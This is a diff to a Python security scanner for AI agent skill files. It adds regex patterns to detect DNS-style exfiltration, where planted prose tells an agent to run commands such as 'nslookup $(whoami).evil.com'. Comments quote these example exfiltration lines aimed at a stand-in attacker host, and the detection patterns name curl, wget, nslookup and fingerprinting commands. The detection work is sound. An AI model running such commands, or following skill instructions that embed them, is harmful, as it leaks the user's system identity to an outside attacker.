@@ -299,13 +299,35 @@ def scan_for_hidden_executable_content(skill_dir: Path) -> list[Finding]:
 # itself — a skill's own workflow commonly says "read references/setup.md for
 # details," so the same attack works one file removed from SKILL.md and would
 # otherwise evade a SKILL.md-only check entirely.
-EXFIL_COMMAND_RE = re.compile(r"\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod)\b", re.IGNORECASE)
+#
+# nslookup/dig/ping added alongside curl/wget: a distinct exfiltration channel
+# (see FINGERPRINT_IN_HOSTNAME_RE below) where the *destination itself* carries
+# the leaked data, so there's never an --data/-X POST flag to find. "host" (the
+# DNS tool) deliberately left out — too common an English word to combine
+# safely with the rest of this check.
+EXFIL_COMMAND_RE = re.compile(
+    r"\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|nslookup|dig|ping)\b", re.IGNORECASE
+)
 SYSTEM_FINGERPRINT_RE = re.compile(
     r"\$\((?:uname|whoami|hostname|env|id)\b|`(?:uname|whoami|hostname|id)\b"
     r"|%COMPUTERNAME%|\$env:(?:USERNAME|COMPUTERNAME)"
 )
 OUTBOUND_DATA_FLAG_RE = re.compile(
     r"--data(?:-binary|-raw)?\b|\s-d\s|--upload-file\b|\s-F\s|-X\s+(?:POST|PUT)\b", re.IGNORECASE
+)
+
+# Classic DNS-exfiltration technique: instead of POSTing gathered info, encode
+# it directly into a hostname (`nslookup $(whoami).evil.com`, `curl https://
+# $(hostname).evil.com/`) — the lookup/request itself is the leak, so
+# OUTBOUND_DATA_FLAG_RE's requirement of an explicit --data/-X POST flag is
+# exactly what this variant is built to avoid needing. Requires the
+# fingerprint substitution to sit directly against a dotted domain suffix (no
+# whitespace between) — "the host system's $(whoami) needs checking against
+# company.com" has the same two ingredients on one line but not touching, and
+# must not match.
+FINGERPRINT_IN_HOSTNAME_RE = re.compile(
+    r"(?:\$\((?:uname|whoami|hostname|env|id)\b[^)]*\)|`(?:uname|whoami|hostname|id)\b[^`]*`)"
+    r"[\w.-]*\.[A-Za-z]{2,}\b"
 )
 
 # The classic "curl pipe bash" install pattern (and its PowerShell equivalent,
@@ -365,6 +387,19 @@ def scan_text_for_prose_instructions(text: str, source: str) -> list[Finding]:
                     summary="Prose instructions tell the agent to run a command that gathers "
                     "system-identifying info and sends it outbound — a plain-text instruction, "
                     "not a bundled script",
+                    detail=f"line {line_no}: {line.strip()[:200]}",
+                    source=source,
+                )
+            )
+            continue
+        if EXFIL_COMMAND_RE.search(line) and FINGERPRINT_IN_HOSTNAME_RE.search(line):
+            findings.append(
+                Finding(
+                    category="skill_md_exfil_instruction",
+                    severity=Severity.CRITICAL,
+                    summary="Prose instructions tell the agent to run a command whose target "
+                    "hostname is built from system-identifying info — DNS-style exfiltration, "
+                    "leaking data via the lookup/request itself rather than a POST body",
                     detail=f"line {line_no}: {line.strip()[:200]}",
                     source=source,
                 )
